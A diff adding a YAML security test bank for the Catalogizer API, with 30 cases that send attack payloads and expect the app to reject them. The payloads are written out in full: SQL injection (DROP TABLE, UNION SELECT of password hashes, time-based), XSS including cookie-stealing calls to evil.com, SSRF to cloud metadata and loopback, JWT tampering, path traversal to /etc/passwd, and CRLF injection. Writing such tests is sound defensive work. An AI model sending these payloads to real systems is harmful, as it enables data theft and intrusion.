@@ -1,0 +1,698 @@
+# SPDX-FileCopyrightText: 2026 Milos Vasic
+# SPDX-License-Identifier: Apache-2.0
+#
+# HelixQA Test Bank: Security Comprehensive (Constitution Article V, Category 6)
+# Deep security testing: SQL injection, XSS, SSRF, auth bypass, authz escalation,
+# path traversal, CSRF, and header injection across all /api/v1 endpoints.
+# Complements security-validation.yaml with adversarial payloads and advanced vectors.
+
+version: "1.0"
+name: "Catalogizer Security Comprehensive Test Bank"
+description: "Advanced security test bank covering SQL injection (classic, union, blind, time-based), XSS (script, event handler, SVG, data URI, encoded), SSRF, auth bypass, authorization escalation, path traversal, CSRF, and header injection"
+metadata:
+  author: "vasic-digital"
+  app: "Catalogizer"
+  version: "2.3.0"
+
+test_cases:
+  # ==================== SQL Injection (SECADV-001 to 005) ====================
+
+  - id: SECADV-001
+    name: "SQL injection: classic OR 1=1 on entity search"
+    category: security
+    priority: critical
+    platforms: [api]
+    steps:
+      - name: "Login as admin"
+        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        expected: "200 OK with JWT token"
+      - name: "Send classic SQL injection in search"
+        action: "GET /api/v1/entities?search=' OR 1=1-- with Authorization header"
+        expected: "200 OK with empty results or only legitimately matching entities, not a full table dump"
+      - name: "Verify entity count matches normal query"
+        action: "GET /api/v1/entities?search=nonexistent_movie_title_xyz"
+        expected: "Same response structure, zero or near-zero results, confirming parameterized queries"
+      - name: "Verify no error information leak"
+        action: "Check response body for SQL syntax errors, table names, or column names"
+        expected: "No SQL error messages, no database schema information in response"
+    tags: [security, sql-injection, classic, or-1-equals-1, search]
+    estimated_duration: "10s"
+    expected_result: "Classic OR 1=1 injection has no effect on parameterized search queries"
+
+  - id: SECADV-002
+    name: "SQL injection: DROP TABLE attempt on entity search"
+    category: security
+    priority: critical
+    platforms: [api]
+    steps:
+      - name: "Login as admin"
+        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        expected: "200 OK with JWT token"
+      - name: "Send DROP TABLE injection in search"
+        action: "GET /api/v1/entities?search='; DROP TABLE media_items; -- with Authorization header"
+        expected: "200 OK with empty results or 400 Bad Request, not a 500 error"
+      - name: "Verify media_items table still exists"
+        action: "GET /api/v1/entities"
+        expected: "200 OK with entity list returned normally, table intact"
+      - name: "Verify no modification to any table"
+        action: "GET /api/v1/entities?per_page=5"
+        expected: "Returns entities with correct count, database unmodified"
+    tags: [security, sql-injection, drop-table, destructive, search]
+    estimated_duration: "15s"
+    expected_result: "DROP TABLE injection is treated as a literal search string, database tables unaffected"
+
+  - id: SECADV-003
+    name: "SQL injection: UNION SELECT credential extraction"
+    category: security
+    priority: critical
+    platforms: [api]
+    steps:
+      - name: "Login as admin"
+        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        expected: "200 OK with JWT token"
+      - name: "Send UNION SELECT injection targeting users"
+        action: "GET /api/v1/entities?search=' UNION SELECT id,username,password_hash,role,'','','','','','','','','' FROM users-- with Authorization header"
+        expected: "200 OK with empty or normal results, no user credentials in response"
+      - name: "Send UNION SELECT with column count probing"
+        action: "GET /api/v1/entities?search=' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- with Authorization header"
+        expected: "200 OK with no injected rows in results"
+      - name: "Verify response contains only entity data"
+        action: "Inspect response JSON for password_hash, jwt_secret, or credential fields"
+        expected: "No credential data present in any response field"
+    tags: [security, sql-injection, union-select, credential-leak, data-exfiltration]
+    estimated_duration: "15s"
+    expected_result: "UNION SELECT injection cannot extract credentials or data from other tables"
+
+  - id: SECADV-004
+    name: "SQL injection: blind boolean-based on entity search"
+    category: security
+    priority: high
+    platforms: [api]
+    steps:
+      - name: "Login as admin"
+        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        expected: "200 OK with JWT token"
+      - name: "Send blind injection with true condition"
+        action: "GET /api/v1/entities?search=' AND 1=1-- with Authorization header"
+        expected: "200 OK with results (same as normal empty search or zero results)"
+      - name: "Send blind injection with false condition"
+        action: "GET /api/v1/entities?search=' AND 1=2-- with Authorization header"
+        expected: "200 OK with same result count as true condition (parameterized query ignores injected logic)"
+      - name: "Compare response sizes"
+        action: "Compare Content-Length of true vs false condition responses"
+        expected: "Identical or near-identical response sizes confirming no blind injection differential"
+    tags: [security, sql-injection, blind, boolean-based, differential]
+    estimated_duration: "15s"
+    expected_result: "Blind boolean-based injection produces no observable difference in responses"
+
+  - id: SECADV-005
+    name: "SQL injection: time-based blind on login endpoint"
+    category: security
+    priority: high
+    platforms: [api]
+    steps:
+      - name: "Send time-based SQLite injection in username"
+        action: "POST /api/v1/auth/login with body {\"username\":\"admin' AND (SELECT CASE WHEN (1=1) THEN RANDOMBLOB(500000000) ELSE 1 END)--\",\"password\":\"test\"}"
+        expected: "401 Unauthorized within 2 seconds (no delayed response)"
+      - name: "Send time-based PostgreSQL injection in username"
+        action: "POST /api/v1/auth/login with body {\"username\":\"admin'; SELECT pg_sleep(10);--\",\"password\":\"test\"}"
+        expected: "401 Unauthorized within 2 seconds (no 10-second delay)"
+      - name: "Verify consistent response time"
+        action: "Measure response time for 5 consecutive injection attempts"
+        expected: "All responses arrive within 2 seconds, confirming no time-based extraction possible"
+    tags: [security, sql-injection, time-based, blind, login, delay]
+    estimated_duration: "20s"
+    expected_result: "Time-based blind injection cannot introduce delays, preventing data extraction via timing"
+
+  # ==================== XSS Payload Injection (SECADV-006 to 010) ====================
+
+  - id: SECADV-006
+    name: "XSS: script tag in entity title via API"
+    category: security
+    priority: critical
+    platforms: [api, web]
+    steps:
+      - name: "Login as admin"
+        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        expected: "200 OK with JWT token"
+      - name: "Create entity with script tag payload"
+        action: "POST /api/v1/entities with body {\"title\":\"<script>document.location='http://evil.com/steal?c='+document.cookie</script>\",\"media_type\":\"movie\"}"
+        expected: "201 Created with title stored as literal text, HTML entities escaped in response"
+      - name: "Retrieve entity via API"
+        action: "GET /api/v1/entities/{id}"
+        expected: "Title field contains escaped HTML: &lt;script&gt; or raw literal text, not executable script"
+      - name: "Verify in web browser"
+        action: "Navigate to entity detail page in catalog-web"
+        expected: "React renders title as text node via JSX, script tag displayed as text, not executed"
+    tags: [security, xss, script-tag, stored, cookie-theft]
+    estimated_duration: "20s"
+    expected_result: "Script tags in entity titles rendered as harmless text in all clients"
+
+  - id: SECADV-007
+    name: "XSS: event handler in entity description"
+    category: security
+    priority: critical
+    platforms: [api, web]
+    steps:
+      - name: "Login as admin"
+        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        expected: "200 OK with JWT token"
+      - name: "Create entity with onmouseover payload"
+        action: "POST /api/v1/entities with body {\"title\":\"Test Movie\",\"description\":\"<div onmouseover=\\\"fetch('http://evil.com/'+document.cookie)\\\">Hover here</div>\",\"media_type\":\"movie\"}"
+        expected: "201 Created"
+      - name: "Create entity with onerror payload"
+        action: "POST /api/v1/entities with body {\"title\":\"Test Movie 2\",\"description\":\"<img src=x onerror=alert(String.fromCharCode(88,83,83))>\",\"media_type\":\"movie\"}"
+        expected: "201 Created"
+      - name: "View entities in web UI"
+        action: "Navigate to both entity pages in catalog-web"
+        expected: "Event handlers not executed; displayed as escaped text or stripped by React rendering"
+    tags: [security, xss, event-handler, onmouseover, onerror, stored]
+    estimated_duration: "20s"
+    expected_result: "Event handler XSS payloads neutralized by React DOM escaping"
+
+  - id: SECADV-008
+    name: "XSS: SVG onload in entity metadata"
+    category: security
+    priority: high
+    platforms: [api, web]
+    steps:
+      - name: "Login as admin"
+        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        expected: "200 OK with JWT token"
+      - name: "Create entity with SVG XSS"
+        action: "POST /api/v1/entities with body {\"title\":\"<svg/onload=alert('XSS')>\",\"media_type\":\"movie\"}"
+        expected: "201 Created with SVG tag stored as literal text"
+      - name: "Create entity with SVG event chain"
+        action: "POST /api/v1/entities with body {\"title\":\"<svg><animate onbegin=alert('XSS')></animate></svg>\",\"media_type\":\"movie\"}"
+        expected: "201 Created"
+      - name: "Retrieve and verify both entities"
+        action: "GET /api/v1/entities for both created entities"
+        expected: "SVG tags returned as escaped text, no alert executed in browser rendering"
+    tags: [security, xss, svg, onload, animate, stored]
+    estimated_duration: "15s"
+    expected_result: "SVG-based XSS vectors neutralized in storage and rendering"
+
+  - id: SECADV-009
+    name: "XSS: data URI scheme injection"
+    category: security
+    priority: high
+    platforms: [api, web]
+    steps:
+      - name: "Login as admin"
+        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        expected: "200 OK with JWT token"
+      - name: "Create entity with data URI XSS"
+        action: "POST /api/v1/entities with body {\"title\":\"<a href=\\\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\\\">Click me</a>\",\"media_type\":\"movie\"}"
+        expected: "201 Created"
+      - name: "Create entity with javascript URI"
+        action: "POST /api/v1/entities with body {\"title\":\"<a href=\\\"javascript:alert('XSS')\\\">Link</a>\",\"media_type\":\"movie\"}"
+        expected: "201 Created"
+      - name: "View in web UI and verify no execution"
+        action: "Navigate to entity list in catalog-web, inspect rendered DOM"
+        expected: "Links not rendered as clickable anchors; displayed as escaped text by React"
+    tags: [security, xss, data-uri, javascript-uri, protocol-injection]
+    estimated_duration: "15s"
+    expected_result: "Data URI and javascript URI payloads rendered as harmless text"
+
+  - id: SECADV-010
+    name: "XSS: encoded and polyglot payloads"
+    category: security
+    priority: high
+    platforms: [api, web]
+    steps:
+      - name: "Login as admin"
+        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        expected: "200 OK with JWT token"
+      - name: "Create entity with HTML entity encoded XSS"
+        action: "POST /api/v1/entities with body {\"title\":\"&#60;script&#62;alert('XSS')&#60;/script&#62;\",\"media_type\":\"movie\"}"
+        expected: "201 Created"
+      - name: "Create entity with URL-encoded XSS"
+        action: "POST /api/v1/entities with body {\"title\":\"%3Cscript%3Ealert('XSS')%3C/script%3E\",\"media_type\":\"movie\"}"
+        expected: "201 Created"
+      - name: "Create entity with polyglot XSS"
+        action: "POST /api/v1/entities with body {\"title\":\"jaVasCript:/*-/*`/*\\`/*'/*\\\"/**/(/* */oNcliCk=alert() )//%%0teleport/teleport>%0d%0a%0d%0a\",\"media_type\":\"movie\"}"
+        expected: "201 Created"
+      - name: "Verify none execute in web UI"
+        action: "Navigate to entity list in catalog-web, check browser console for alerts"
+        expected: "Zero JavaScript alerts, zero console errors from XSS payloads"
+    tags: [security, xss, encoded, polyglot, html-entity, url-encoding]
+    estimated_duration: "20s"
+    expected_result: "All encoded and polyglot XSS payloads neutralized by defense-in-depth"
+
+  # ==================== SSRF via URL-Accepting Endpoints (SECADV-011 to 013) ====================
+
+  - id: SECADV-011
+    name: "SSRF: internal IP address in storage root URL"
+    category: security
+    priority: critical
+    platforms: [api]
+    steps:
+      - name: "Login as admin"
+        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        expected: "200 OK with JWT token"
+      - name: "Submit storage root with internal IP 10.x"
+        action: "POST /api/v1/storage-roots with body {\"name\":\"evil\",\"path\":\"http://10.0.0.1:8080/internal-api\",\"protocol\":\"webdav\"}"
+        expected: "400 Bad Request or validation error rejecting private IP range"
+      - name: "Submit storage root with 192.168.x.x"
+        action: "POST /api/v1/storage-roots with body {\"name\":\"evil2\",\"path\":\"http://192.168.1.1/admin\",\"protocol\":\"webdav\"}"
+        expected: "400 Bad Request or validation error (private IPs blocked for external storage)"
+      - name: "Verify no outbound connection made"
+        action: "Check server logs for connection attempts to internal IPs"
+        expected: "No connection attempts logged to internal network addresses"
+    tags: [security, ssrf, internal-ip, private-network, storage-root]
+    estimated_duration: "15s"
+    expected_result: "Storage root creation rejects URLs pointing to internal/private IP ranges"
+
+  - id: SECADV-012
+    name: "SSRF: AWS metadata endpoint via storage URL"
+    category: security
+    priority: critical
+    platforms: [api]
+    steps:
+      - name: "Login as admin"
+        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        expected: "200 OK with JWT token"
+      - name: "Submit AWS metadata URL"
+        action: "POST /api/v1/storage-roots with body {\"name\":\"aws-meta\",\"path\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\",\"protocol\":\"webdav\"}"
+        expected: "400 Bad Request rejecting link-local address range"
+      - name: "Submit AWS metadata via DNS rebinding"
+        action: "POST /api/v1/storage-roots with body {\"name\":\"rebind\",\"path\":\"http://169.254.169.254.nip.io/latest/meta-data/\",\"protocol\":\"webdav\"}"
+        expected: "400 Bad Request or connection blocked after DNS resolution check"
+      - name: "Verify no metadata retrieved"
+        action: "Check response body for IAM credentials, access keys, or instance metadata"
+        expected: "No cloud metadata in any response"
+    tags: [security, ssrf, aws-metadata, cloud, link-local, dns-rebinding]
+    estimated_duration: "15s"
+    expected_result: "Cloud metadata endpoints unreachable through storage URL submission"
+
+  - id: SECADV-013
+    name: "SSRF: localhost and loopback via storage URL"
+    category: security
+    priority: critical
+    platforms: [api]
+    steps:
+      - name: "Login as admin"
+        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        expected: "200 OK with JWT token"
+      - name: "Submit localhost URL targeting Redis"
+        action: "POST /api/v1/storage-roots with body {\"name\":\"redis\",\"path\":\"http://127.0.0.1:6379/\",\"protocol\":\"webdav\"}"
+        expected: "400 Bad Request rejecting loopback address"
+      - name: "Submit localhost URL targeting PostgreSQL"
+        action: "POST /api/v1/storage-roots with body {\"name\":\"postgres\",\"path\":\"http://localhost:5432/\",\"protocol\":\"webdav\"}"
+        expected: "400 Bad Request rejecting localhost"
+      - name: "Submit IPv6 loopback"
+        action: "POST /api/v1/storage-roots with body {\"name\":\"ipv6\",\"path\":\"http://[::1]:8080/\",\"protocol\":\"webdav\"}"
+        expected: "400 Bad Request rejecting IPv6 loopback"
+    tags: [security, ssrf, localhost, loopback, ipv6, internal-services]
+    estimated_duration: "15s"
+    expected_result: "Loopback and localhost URLs blocked in all forms to prevent access to co-located services"
+
+  # ==================== Authentication Bypass (SECADV-014 to 018) ====================
+
+  - id: SECADV-014
+    name: "Auth bypass: expired JWT token rejected"
+    category: security
+    priority: critical
+    platforms: [api]
+    steps:
+      - name: "Craft JWT with exp in the past"
+        action: "Create JWT with payload {\"username\":\"admin\",\"role\":\"admin\",\"exp\":1609459200} signed with server secret"
+        expected: "Token created with expiry 2021-01-01"
+      - name: "Access protected endpoint"
+        action: "GET /api/v1/entities with Authorization: Bearer {expired_token}"
+        expected: "401 Unauthorized with 'token expired' or 'token is expired' error message"
+      - name: "Access admin endpoint"
+        action: "GET /api/v1/admin/users with Authorization: Bearer {expired_token}"
+        expected: "401 Unauthorized"
+      - name: "Verify error message does not leak server details"
+        action: "Inspect error response body"
+        expected: "Generic authentication error, no stack trace or internal details"
+    tags: [security, auth-bypass, expired-token, jwt, expiration]
+    estimated_duration: "10s"
+    expected_result: "Expired tokens rejected at all endpoints regardless of role claims"
+
+  - id: SECADV-015
+    name: "Auth bypass: modified JWT signature rejected"
+    category: security
+    priority: critical
+    platforms: [api]
+    steps:
+      - name: "Login and get valid token"
+        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        expected: "200 OK with valid JWT token"
+      - name: "Modify token payload and resign with wrong key"
+        action: "Decode JWT, change role to 'superadmin', resign with key 'attacker-secret-key'"
+        expected: "Modified token created"
+      - name: "Access protected endpoint with modified token"
+        action: "GET /api/v1/entities with Authorization: Bearer {modified_token}"
+        expected: "401 Unauthorized (signature validation fails)"
+      - name: "Try alg:none attack on modified token"
+        action: "Set JWT header alg to 'none', remove signature, access GET /api/v1/entities"
+        expected: "401 Unauthorized (none algorithm rejected)"
+    tags: [security, auth-bypass, jwt-tampering, signature, alg-none]
+    estimated_duration: "15s"
+    expected_result: "JWT signature validation prevents token tampering and algorithm confusion attacks"
+
+  - id: SECADV-016
+    name: "Auth bypass: missing Authorization header"
+    category: security
+    priority: critical
+    platforms: [api]
+    steps:
+      - name: "Access entities without any auth"
+        action: "GET /api/v1/entities with no Authorization header"
+        expected: "401 Unauthorized"
+      - name: "Access storage roots without auth"
+        action: "GET /api/v1/storage-roots with no Authorization header"
+        expected: "401 Unauthorized"
+      - name: "Access admin users without auth"
+        action: "GET /api/v1/admin/users with no Authorization header"
+        expected: "401 Unauthorized"
+      - name: "Access files without auth"
+        action: "GET /api/v1/files?path=/ with no Authorization header"
+        expected: "401 Unauthorized"
+      - name: "Verify health endpoint remains public"
+        action: "GET /api/v1/health with no Authorization header"
+        expected: "200 OK (health is intentionally public)"
+    tags: [security, auth-bypass, missing-header, unauthenticated, endpoint-protection]
+    estimated_duration: "10s"
+    expected_result: "All endpoints except health require authentication"
+
+  - id: SECADV-017
+    name: "Auth bypass: SQL injection in login credentials"
+    category: security
+    priority: critical
+    platforms: [api]
+    steps:
+      - name: "SQL injection in username field"
+        action: "POST /api/v1/auth/login with body {\"username\":\"admin'--\",\"password\":\"anything\"}"
+        expected: "401 Unauthorized (injection treated as literal username)"
+      - name: "SQL injection to bypass password check"
+        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"' OR '1'='1\"}"
+        expected: "401 Unauthorized (password compared via bcrypt hash, not string)"
+      - name: "SQL injection with UNION in username"
+        action: "POST /api/v1/auth/login with body {\"username\":\"' UNION SELECT 1,'admin','$2a$10$hash','admin'--\",\"password\":\"test\"}"
+        expected: "401 Unauthorized"
+      - name: "Verify no login bypass occurred"
+        action: "Check response for any JWT token"
+        expected: "No token field in any 401 response"
+    tags: [security, auth-bypass, sql-injection, login, credential-bypass]
+    estimated_duration: "15s"
+    expected_result: "SQL injection in login fields cannot bypass bcrypt-based authentication"
+
+  - id: SECADV-018
+    name: "Auth bypass: brute force detection and lockout"
+    category: security
+    priority: high
+    platforms: [api]
+    steps:
+      - name: "Send 10 failed login attempts rapidly"
+        action: "POST /api/v1/auth/login with wrong password 10 times in 5 seconds"
+        expected: "First few return 401, then subsequent return 429 Too Many Requests"
+      - name: "Verify rate limit header"
+        action: "Check response headers on 429 response"
+        expected: "Retry-After or X-RateLimit-Reset header present"
+      - name: "Wait for rate limit window to reset"
+        action: "Wait for Retry-After duration, then attempt valid login"
+        expected: "200 OK with valid JWT token after rate limit resets"
+      - name: "Verify account not permanently locked"
+        action: "Login with correct credentials after rate limit reset"
+        expected: "200 OK confirming temporary rate limit, not permanent lockout"
+    tags: [security, auth-bypass, brute-force, rate-limit, lockout, recovery]
+    estimated_duration: "30s"
+    expected_result: "Brute force attempts rate-limited but legitimate users can recover after cooldown"
+
+  # ==================== Authorization Escalation (SECADV-019 to 022) ====================
+
+  - id: SECADV-019
+    name: "Authz escalation: regular user accessing admin endpoints"
+    category: security
+    priority: critical
+    platforms: [api]
+    steps:
+      - name: "Login as regular user"
+        action: "POST /api/v1/auth/login with body {\"username\":\"user\",\"password\":\"user123\"}"
+        expected: "200 OK with JWT token (regular user role)"
+      - name: "Access admin user list"
+        action: "GET /api/v1/admin/users with regular user token"
+        expected: "403 Forbidden"
+      - name: "Access admin logs"
+        action: "GET /api/v1/admin/logs with regular user token"
+        expected: "403 Forbidden"
+      - name: "Attempt to create admin user"
+        action: "POST /api/v1/admin/users with body {\"username\":\"hacker\",\"password\":\"hack123\",\"role\":\"admin\"} using regular user token"
+        expected: "403 Forbidden"
+    tags: [security, authorization, escalation, rbac, admin-access]
+    estimated_duration: "15s"
+    expected_result: "Regular users cannot access any admin-only endpoints"
+
+  - id: SECADV-020
+    name: "Authz escalation: modify another user's data"
+    category: security
+    priority: critical
+    platforms: [api]
+    steps:
+      - name: "Login as user A"
+        action: "POST /api/v1/auth/login with body {\"username\":\"user\",\"password\":\"user123\"}"
+        expected: "200 OK with JWT token for user A"
+      - name: "Create a collection as user A"
+        action: "POST /api/v1/collections with body {\"name\":\"My Private Collection\"} using user A token"
+        expected: "201 Created with collection ID"
+      - name: "Login as user B (admin)"
+        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        expected: "200 OK with JWT token for user B"
+      - name: "Attempt to modify user A's collection as user B"
+        action: "PUT /api/v1/collections/{user_a_collection_id} with body {\"name\":\"Stolen\"} using user B non-admin token"
+        expected: "403 Forbidden or 404 Not Found (user B cannot see/modify user A's collection)"
+    tags: [security, authorization, cross-user, data-isolation, collection]
+    estimated_duration: "20s"
+    expected_result: "Users cannot modify resources belonging to other users"
+
+  - id: SECADV-021
+    name: "Authz escalation: self-elevate role via API"
+    category: security
+    priority: critical
+    platforms: [api]
+    steps:
+      - name: "Login as regular user"
+        action: "POST /api/v1/auth/login with body {\"username\":\"user\",\"password\":\"user123\"}"
+        expected: "200 OK with JWT token (role=user)"
+      - name: "Attempt to change own role via profile update"
+        action: "PUT /api/v1/auth/profile with body {\"role\":\"admin\"} using regular user token"
+        expected: "400 Bad Request (role field ignored or rejected) or 403 Forbidden"
+      - name: "Verify role unchanged"
+        action: "GET /api/v1/auth/me with regular user token"
+        expected: "Role still 'user', not 'admin'"
+      - name: "Attempt to change role via direct user endpoint"
+        action: "PUT /api/v1/admin/users/{own_id} with body {\"role\":\"admin\"} using regular user token"
+        expected: "403 Forbidden (admin endpoint rejects regular user)"
+    tags: [security, authorization, role-escalation, self-elevation, privilege]
+    estimated_duration: "15s"
+    expected_result: "Users cannot self-elevate their role through any API endpoint"
+
+  - id: SECADV-022
+    name: "Authz escalation: access other user's collections and favorites"
+    category: security
+    priority: high
+    platforms: [api]
+    steps:
+      - name: "Login as admin and create collection"
+        action: "POST /api/v1/auth/login as admin, then POST /api/v1/collections with body {\"name\":\"Admin Picks\"}"
+        expected: "201 Created with collection ID"
+      - name: "Login as regular user"
+        action: "POST /api/v1/auth/login with body {\"username\":\"user\",\"password\":\"user123\"}"
+        expected: "200 OK with JWT token"
+      - name: "Attempt to read admin's collection by ID"
+        action: "GET /api/v1/collections/{admin_collection_id} using regular user token"
+        expected: "403 Forbidden or 404 Not Found"
+      - name: "Attempt to delete admin's collection"
+        action: "DELETE /api/v1/collections/{admin_collection_id} using regular user token"
+        expected: "403 Forbidden or 404 Not Found"
+      - name: "Attempt to list admin's favorites"
+        action: "GET /api/v1/favorites?user_id={admin_id} using regular user token"
+        expected: "403 Forbidden or only returns regular user's own favorites"
+    tags: [security, authorization, cross-user, collections, favorites, isolation]
+    estimated_duration: "20s"
+    expected_result: "Users cannot access or modify collections and favorites belonging to other users"
+
+  # ==================== Path Traversal (SECADV-023 to 025) ====================
+
+  - id: SECADV-023
+    name: "Path traversal: ../../../etc/passwd via file browser"
+    category: security
+    priority: critical
+    platforms: [api]
+    steps:
+      - name: "Login as admin"
+        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        expected: "200 OK with JWT token"
+      - name: "Request /etc/passwd via traversal"
+        action: "GET /api/v1/files?path=../../../../../../../etc/passwd with Authorization header"
+        expected: "400 Bad Request or 403 Forbidden, no file content returned"
+      - name: "Request with deep nesting"
+        action: "GET /api/v1/files?path=....//....//....//....//etc/passwd"
+        expected: "400 Bad Request or 403 Forbidden"
+      - name: "Request Windows path traversal"
+        action: "GET /api/v1/files?path=..\\..\\..\\..\\Windows\\System32\\config\\SAM"
+        expected: "400 Bad Request or 403 Forbidden"
+      - name: "Verify no system file content in any response"
+        action: "Check all response bodies for root:x: or system file content"
+        expected: "No system file content leaked"
+    tags: [security, path-traversal, etc-passwd, file-browser, lfi]
+    estimated_duration: "15s"
+    expected_result: "Path traversal attempts blocked at all nesting levels and on all OS path formats"
+
+  - id: SECADV-024
+    name: "Path traversal: encoded variants"
+    category: security
+    priority: critical
+    platforms: [api]
+    steps:
+      - name: "Login as admin"
+        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        expected: "200 OK with JWT token"
+      - name: "URL-encoded traversal"
+        action: "GET /api/v1/files?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+        expected: "400 Bad Request or 403 Forbidden"
+      - name: "Double-encoded traversal"
+        action: "GET /api/v1/files?path=%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+        expected: "400 Bad Request or 403 Forbidden"
+      - name: "UTF-8 overlong encoding traversal"
+        action: "GET /api/v1/files?path=%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd"
+        expected: "400 Bad Request or 403 Forbidden"
+      - name: "Unicode normalization traversal"
+        action: "GET /api/v1/files?path=..%c0%af..%c0%af..%c0%afetc/passwd"
+        expected: "400 Bad Request or 403 Forbidden"
+    tags: [security, path-traversal, url-encoding, double-encoding, utf8-overlong]
+    estimated_duration: "15s"
+    expected_result: "All encoding-based path traversal bypass attempts rejected"
+
+  - id: SECADV-025
+    name: "Path traversal: null byte injection to bypass extension checks"
+    category: security
+    priority: high
+    platforms: [api]
+    steps:
+      - name: "Login as admin"
+        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        expected: "200 OK with JWT token"
+      - name: "Null byte to truncate extension"
+        action: "GET /api/v1/files?path=../../../etc/passwd%00.jpg"
+        expected: "400 Bad Request or 403 Forbidden"
+      - name: "Null byte in middle of path"
+        action: "GET /api/v1/files?path=valid/path%00/../../../etc/passwd"
+        expected: "400 Bad Request or 403 Forbidden"
+      - name: "Verify server stability"
+        action: "GET /api/v1/health"
+        expected: "200 OK (null bytes did not crash the server)"
+    tags: [security, path-traversal, null-byte, extension-bypass, truncation]
+    estimated_duration: "10s"
+    expected_result: "Null byte injection cannot bypass path validation or extension checks"
+
+  # ==================== CSRF Verification (SECADV-026 to 028) ====================
+
+  - id: SECADV-026
+    name: "CSRF: state-changing request without proper origin"
+    category: security
+    priority: high
+    platforms: [api, web]
+    steps:
+      - name: "Login and get token"
+        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        expected: "200 OK with JWT token"
+      - name: "Send POST from unauthorized origin"
+        action: "POST /api/v1/collections with body {\"name\":\"CSRF Test\"}, Authorization header, and Origin: http://evil.example.com"
+        expected: "403 Forbidden or CORS preflight blocks the request"
+      - name: "Send DELETE from unauthorized origin"
+        action: "DELETE /api/v1/collections/1 with Authorization header and Origin: http://attacker.com"
+        expected: "403 Forbidden or CORS blocks"
+      - name: "Verify from authorized origin works"
+        action: "POST /api/v1/collections with body {\"name\":\"Legit\"}, Authorization header, and Origin: http://localhost:3000"
+        expected: "201 Created (authorized origin allowed)"
+    tags: [security, csrf, origin-validation, cross-origin, state-change]
+    estimated_duration: "15s"
+    expected_result: "State-changing requests from unauthorized origins rejected via CORS"
+
+  - id: SECADV-027
+    name: "CSRF: cross-origin request with credentials"
+    category: security
+    priority: high
+    platforms: [web]
+    steps:
+      - name: "Simulate cross-origin fetch with credentials"
+        action: "From a page on http://evil.com, send fetch('http://localhost:8080/api/v1/entities', {credentials:'include', method:'DELETE'})"
+        expected: "Browser blocks request due to CORS policy (no Access-Control-Allow-Credentials from evil origin)"
+      - name: "Verify preflight rejects evil origin"
+        action: "OPTIONS /api/v1/entities with Origin: http://evil.com and Access-Control-Request-Method: DELETE"
+        expected: "No Access-Control-Allow-Origin header matching evil.com"
+      - name: "Verify SameSite cookie attribute"
+        action: "Inspect any Set-Cookie headers from the API"
+        expected: "SameSite=Strict or SameSite=Lax attribute present"
+    tags: [security, csrf, cross-origin, credentials, samesite, cookies]
+    estimated_duration: "15s"
+    expected_result: "Cross-origin credentialed requests blocked by CORS and SameSite cookie policy"
+
+  - id: SECADV-028
+    name: "CSRF: form-based POST attack simulation"
+    category: security
+    priority: medium
+    platforms: [api, web]
+    steps:
+      - name: "Simulate form POST from external site"
+        action: "POST /api/v1/auth/login with Content-Type: application/x-www-form-urlencoded and body username=admin&password=admin123 from Origin: http://evil.com"
+        expected: "415 Unsupported Media Type or CORS rejection (API requires application/json)"
+      - name: "Verify JSON content type enforced"
+        action: "POST /api/v1/collections with Content-Type: multipart/form-data and Origin: http://evil.com"
+        expected: "415 Unsupported Media Type or 400 Bad Request"
+      - name: "Verify standard JSON POST works"
+        action: "POST /api/v1/auth/login with Content-Type: application/json from Origin: http://localhost:3000"
+        expected: "200 OK or 401 (correct Content-Type accepted)"
+    tags: [security, csrf, form-post, content-type, enforcement]
+    estimated_duration: "10s"
+    expected_result: "Form-based CSRF attacks blocked by Content-Type enforcement and CORS"
+
+  # ==================== Header Injection (SECADV-029 to 030) ====================
+
+  - id: SECADV-029
+    name: "Header injection: CRLF injection in response"
+    category: security
+    priority: high
+    platforms: [api]
+    steps:
+      - name: "Login as admin"
+        action: "POST /api/v1/auth/login with body {\"username\":\"admin\",\"password\":\"admin123\"}"
+        expected: "200 OK with JWT token"
+      - name: "Send CRLF in search parameter"
+        action: "GET /api/v1/entities?search=test%0d%0aX-Injected-Header:%20evil with Authorization header"
+        expected: "200 OK with no X-Injected-Header in response headers"
+      - name: "Send CRLF in path parameter"
+        action: "GET /api/v1/files?path=test%0d%0aSet-Cookie:%20session=hijacked"
+        expected: "No Set-Cookie: session=hijacked header in response"
+      - name: "Verify response headers are clean"
+        action: "Inspect all response headers for injected values"
+        expected: "Only legitimate server-set headers present"
+    tags: [security, header-injection, crlf, response-splitting]
+    estimated_duration: "10s"
+    expected_result: "CRLF characters in parameters cannot inject headers into HTTP response"
+
+  - id: SECADV-030
+    name: "Header injection: Host header manipulation"
+    category: security
+    priority: high
